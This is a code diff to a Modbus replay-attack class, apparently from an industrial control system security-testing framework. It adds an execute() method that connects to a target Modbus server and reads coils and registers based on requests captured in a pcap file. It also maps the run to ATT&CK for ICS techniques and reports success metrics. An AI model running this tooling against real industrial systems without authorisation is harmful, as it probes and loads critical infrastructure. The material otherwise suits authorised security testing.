@@ -5,6 +5,8 @@ from pymodbus.client import ModbusTcpClient
 from scapy.all import rdpcap
 from scapy.layers.inet import TCP
 from tabulate import tabulate
+from .attack_result import AttackResult
+from .attack_mapping import get_attack_techniques
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger()
@@ -15,15 +17,17 @@ class ModbusReplyAttacker:
         self.target_port = target_port
         self.client = None
 
-    def load_modbus_packets(self, pcap_file="ModbusTraffic.pcap"):
+    def load_modbus_packets(self, pcap_file="ModbusTraffic.pcap", log_output=True):
         """Reads and filters Modbus REQUEST packets from a pcap file."""
-        logger.info("Loading packets from %s", pcap_file)
+        if log_output:
+            logger.info("Loading packets from %s", pcap_file)
         packets = rdpcap(pcap_file)
-        logger.info("Loaded %d packets", len(packets))
+        if log_output:
+            logger.info("Loaded %d packets", len(packets))
 
         modbus_request_packets = []
         packet_count = 0
-        
+
         for packet in packets:
             if TCP in packet and packet[TCP].payload:
                 raw_data = bytes(packet[TCP].payload)
@@ -35,14 +39,16 @@ class ModbusReplyAttacker:
                         if packet_count % 2 == 1:
                             modbus_request_packets.append((parsed, raw_data))
 
-        logger.info("Found %d Modbus request packets", len(modbus_request_packets))
+        if log_output:
+            logger.info("Found %d Modbus request packets", len(modbus_request_packets))
         return modbus_request_packets
 
-    def connect_to_target(self):
+    def connect_to_target(self, log_output=True):
         """Establishes a connection to the target Modbus server."""
         self.client = ModbusTcpClient(host=self.target_ip, port=self.target_port)
         if not self.client.connect():
-            logger.error("Failed to connect to target")
+            if log_output:
+                logger.error("Failed to connect to target")
             return False
         return True
 
@@ -82,10 +88,102 @@ class ModbusReplyAttacker:
                     logger.info("\n" + self.decode_response(func_code, response))
             except Exception as e:
                 logger.error("Error during replay: %s", str(e))
-            
+
             time.sleep(0.1)
         self.client.close()
         logger.info("\nReplay attack completed")
+
+    def execute(self, pcap_file="ModbusTraffic.pcap"):
+        """
+        Execute replay attack and return structured result.
+
+        Args:
+            pcap_file (str): Path to PCAP file containing Modbus traffic
+
+        Returns:
+            AttackResult with replay metrics
+        """
+        result = AttackResult(
+            attack='replay',
+            target={'host': self.target_ip, 'port': self.target_port, 'unit_id': None},
+            params={'pcap_file': pcap_file},
+            success=False,
+            timestamp=AttackResult.create('replay', self.target_ip, self.target_port).timestamp,
+            data={},
+            error=None
+        )
+
+        # Populate ATT&CK for ICS technique mapping early (before early returns)
+        techniques = get_attack_techniques('replay')
+        if techniques:
+            result.attack_technique = techniques[0] if len(techniques) == 1 else {'techniques': techniques}
+
+        try:
+            # Check if pcap file exists
+            if not os.path.exists(pcap_file):
+                result.error = f"PCAP file not found: {pcap_file}"
+                return result
+
+            # Load packets
+            modbus_packets = self.load_modbus_packets(pcap_file, log_output=False)
+
+            if not modbus_packets:
+                result.error = "No valid Modbus request packets found in PCAP file"
+                return result
+
+            # Connect to target
+            if not self.connect_to_target(log_output=False):
+                result.error = "Failed to connect to target Modbus server"
+                return result
+
+            # Replay packets
+            replayed_count = 0
+            errors = []
+
+            for i, (parsed, _) in enumerate(modbus_packets, 1):
+                func_code = parsed['function_code']
+
+                try:
+                    if func_code == 1:
+                        response = self.client.read_coils(address=0, count=8)
+                    elif func_code == 2:
+                        response = self.client.read_discrete_inputs(address=0, count=8)
+                    elif func_code == 3:
+                        response = self.client.read_holding_registers(address=0, count=4)
+                    elif func_code == 4:
+                        response = self.client.read_input_registers(address=0, count=4)
+
+                    if not response.isError():
+                        replayed_count += 1
+                    else:
+                        errors.append(f"Packet {i}: Response error")
+
+                except Exception as e:
+                    errors.append(f"Packet {i}: {str(e)}")
+
+                time.sleep(0.1)
+
+            self.client.close()
+
+            # Populate result data
+            result.data = {
+                'pcap_file': pcap_file,
+                'total_packets_in_pcap': len(modbus_packets),
+                'packets_replayed': replayed_count,
+                'errors': errors if errors else None,
+                'success_rate': replayed_count / len(modbus_packets) if modbus_packets else 0
+            }
+            result.success = replayed_count > 0
+
+        except Exception as e:
+            result.error = str(e)
+            if self.client:
+                try:
+                    self.client.close()
+                except:
+                    pass
+
+        return result
 
     def parse_modbus_packet(self, raw_data):
         """Parses raw Modbus packet data."""
@@ -120,7 +218,7 @@ if __name__ == "__main__":
         logger.error("This script requires root privileges to replay packets")
         logger.error("Please run with sudo")
         sys.exit(1)
-    
+
     attacker = ModbusReplyAttacker()
     modbus_packets = attacker.load_modbus_packets()
     if attacker.connect_to_target():
